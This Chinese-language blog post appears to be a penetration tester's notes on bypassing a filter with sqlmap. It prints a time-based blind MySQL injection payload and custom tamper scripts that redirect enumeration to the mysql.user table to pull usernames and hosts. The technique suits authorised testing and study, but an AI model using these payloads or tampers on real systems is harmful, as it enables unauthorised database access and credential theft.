遇到个环境，跑用户名不出来，数据库只出了一个，且不出来表

用户名部分

![](../Images/a7d16cafac49cc40f839b988ee463bff.png)

\--users、--current-user都不行，没出用户，去查看sqlmap的payload，发现取user是用current\_user()

![](../Images/6c685f44c77830650dbef8dd716839a6.png)

不用current\_user()，用user()就成功了，  

![](../Images/57c2e6f52df85fe06161649738ee9b54.png)

随便写个tamper，替换CURRENT\_  

![](../Images/4654b2a78332a2c281ec2789fdaa1867.png)

带入tamper，出用户  

![](../Images/1ab29b8cf00c8487658431f8272876ce.png)

数据库部分

数据库出来了一个db，db里的表也出不来  

![](../Images/667a78ddcf48a0811ceeadf3cacae352.png)

payload为：

AND (SELECT 9923 FROM (SELECT(SLEEP(5-(IF(ASCII(SUBSTR((SELECT IFNULL(CAST(COUNT(table\_name) AS CHAR),0x20) FROM INFORMATION\_SCHEMA.TABLES WHERE table\_schema=0x64625f6e6a6174),1,1))>48,0,5)))))lxrL) AND (1092=1092)

  

这条语句理解也不难，蓝色是把表里的table\_name进行count一下，通过ifnull，如果第一个表达式有值，就用第一个表达式的，反之就用第二个表达式即0x20，红色是从INFORMATION\_SCHEMA.TABLES表里取table\_schema为0x6462xxxx，十六进制解码即为dbxxx

  

但是这里测试INFORMATION\_SCHEMA.TABLES出现就不行，所以换个思路，去注mysql.user表

![](../Images/e39016ed3867da2006843ee723643056.png)

  

![](../Images/a0f5787bc7ed0baf318290f1daf37a8f.png)

虽然选中的是dbxxx，但是注的数据还是mysql.user里的user字段  

(0x6462xxx的值可以根据-D后面的参数进行更换)

  

第二个replace可以更换成其他的值，比如host啥的

![](../Images/1a5cd19d0c91febab12a2f6ebfde4436.png)

取mysql.user里的host字段

（\-D换成了dbd，所以十六进制数据为0x646264(dbd实际不存在)）

  

![](../Images/385505dd96df2c834418b112431c5b61.png)

![](../Images/6fd85655bfe66a881ba1d5c7c22bfb64.png)

```
"""Copyright (c) 2006-2019 sqlmap developers (http://sqlmap.org/)See the file 'LICENSE' for copying permissionAuthor:pureqh.top"""import refrom lib.core.data import kbfrom lib.core.enums import PRIORITYfrom lib.core.common import singleTimeWarnMessagefrom lib.core.enums import DBMS__priority__ = PRIORITY.LOW
def dependencies():    pass
def tamper(payload, **kwargs):    return payload.replace('INFORMATION_SCHEMA.TABLES WHERE table_schema=0x646264','mysql.user').replace('table_name','host').replace('table_name','*')
```
